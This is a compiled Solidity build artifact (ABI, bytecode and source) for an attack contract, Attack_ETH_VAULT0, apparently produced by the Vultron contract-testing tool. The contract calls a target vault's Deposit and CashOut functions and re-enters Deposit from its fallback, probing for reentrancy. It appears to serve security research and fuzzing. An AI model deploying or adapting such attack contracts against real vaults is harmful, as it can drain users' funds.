{
  "contractName": "Attack_ETH_VAULT0",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "target_contract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_targetContract",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "vultron_amount",
          "type": "uint256"
        }
      ],
      "name": "vultron_Deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "vultron_amount",
          "type": "uint256"
        },
        {
          "name": "_am",
          "type": "uint256"
        }
      ],
      "name": "vultron_CashOut",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040516020806103ac83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610336806100766000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806351d2e067146100f6578063574ffc31146101165780639b7a71b91461016d575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed21248c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b50505050005b61011460048036038101908080359060200190929190505050610197565b005b34801561012257600080fd5b5061012b610238565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610195600480360381019080803590602001909291908035906020019092919050505061025d565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed21248c826040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561021c57600080fd5b505af1158015610230573d6000803e3d6000fd5b505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ffa071183836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b1580156102ed57600080fd5b505af1158015610301573d6000803e3d6000fd5b505050505050505600a165627a7a72305820a7555654d23adc5c869e347acb2d9755a77cabd7746f5a1e5d5748e1b59a128a0029",
  "source": "pragma solidity ^0.4.19;\n\nimport \"/home/liuye/Webank/vultron/contracts/ETH_VAULT.sol\";\n\ncontract Attack_ETH_VAULT0 {\n\n  ETH_VAULT public target_contract;\n\n  function Attack_ETH_VAULT0(address _targetContract) public payable {\n      target_contract = ETH_VAULT(_targetContract);\n  } \n\n  function vultron_Deposit(uint256 vultron_amount) public payable{\n    target_contract.Deposit.value(vultron_amount)();\n  } \n\n  function vultron_CashOut(uint256 vultron_amount, uint256 _am) public payable{\n    target_contract.CashOut.value(vultron_amount)(_am);\n  } \n\n      function() public payable {\n        \n        target_contract.Deposit();\n      }\n      } \n",
  "sourcePath": "/home/liuye/Webank/vultron/contracts/Attack_ETH_VAULT0.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2020-05-01T07:32:10.690Z"
}